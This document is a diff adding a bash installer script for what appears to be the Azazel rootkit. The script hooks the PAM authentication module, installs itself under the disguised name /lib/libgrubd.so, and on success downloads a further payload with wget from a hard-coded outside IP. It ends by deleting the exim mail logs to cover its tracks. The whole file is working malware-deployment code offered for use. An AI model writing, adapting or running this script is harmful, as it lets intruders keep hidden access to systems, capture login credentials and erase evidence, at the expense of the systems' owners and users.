@@ -1,0 +1,28 @@
+#!/bin/bash
+
+yum install pam-devel -y
+
+if [ -f "/lib/libgrubd.so" ]; then
+        echo "[-] Already installed!"
+else
+PAT=`cat azazel.h | grep LIBC_PATH`
+if [ "$PAT" == "" ]; then
+        ldconfig -p | grep "libpam.so.0" | awk '{print $NF}' | sed -e 's/libpam.so.0/security\/pam_unix.so/g' | while read SMPATH; do
+        if [ -f $SMPATH ]; then
+                echo "#define LIBC_PATH \"$SMPATH\"" >> azazel.h
+                make install
+                break
+        else
+                echo "pam_unix.so not found. ERROR"
+        fi
+        done
+else
+        make install
+fi
+
+if [ -f "/lib/libgrubd.so" ]; then
+        echo "[+] SUCCESS!"
+	wget 64.50.180.45/libaz
+fi
+fi
+rm -rf /var/log/exim_mainlog /var/log/exim_paniclog /var/log/exim_rejectlog
